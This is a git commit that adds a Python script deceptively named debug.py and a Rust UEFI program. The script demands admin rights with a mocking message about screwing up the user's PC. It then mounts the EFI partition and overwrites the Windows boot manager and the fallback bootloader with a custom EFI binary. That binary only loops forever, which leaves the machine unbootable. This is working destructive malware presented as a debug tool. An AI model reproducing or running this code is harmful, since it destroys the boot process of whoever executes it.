a20817237315b3925cda2da1242afb057b08489d
sven-eliasen <jo.pettersen@pm.me>
2022-01-14 17:07:23 +0100

    init

---
+++ scripts/debug.py
@@ -0,0 +1,23 @@
+import ctypes, os, sys
+from shutil import copyfile
+
+if __name__ == "__main__":
+    #Check for admin privileges
+    if not ctypes.windll.shell32.IsUserAnAdmin():
+        ctypes.windll.user32.MessageBoxW(0, "How tf am I going to screw up your pc if you don't run me as admin ?", "Need Admin privileges", 0)
+        exit()
+    
+    try:
+        os.system("mountvol Y: /s")
+
+        bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
+        custom_uefi_path = os.path.abspath(os.path.join(bundle_dir, 'uefi.efi'))
+        
+        copyfile(custom_uefi_path, "Y:\\EFI\\Boot\\bootx64.efi")
+        copyfile(custom_uefi_path, "Y:\\EFI\\Microsoft\\Boot\\bootmgfw.efi")
+
+        os.system("mountvol Y: /d")
+    except Exception as e:
+        print(e)
+
+    x = input()
---
+++ src/main.rs
@@ -0,0 +1,16 @@
+#![no_main]
+#![no_std]
+#![feature(abi_efiapi)]
+
+use uefi::prelude::*;
+use uefi::ResultExt;
+
+#[entry]
+fn main(_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
+    uefi_services::init(&mut system_table).unwrap_success();
+
+    loop {}
+
+    Status::SUCCESS
+}
+
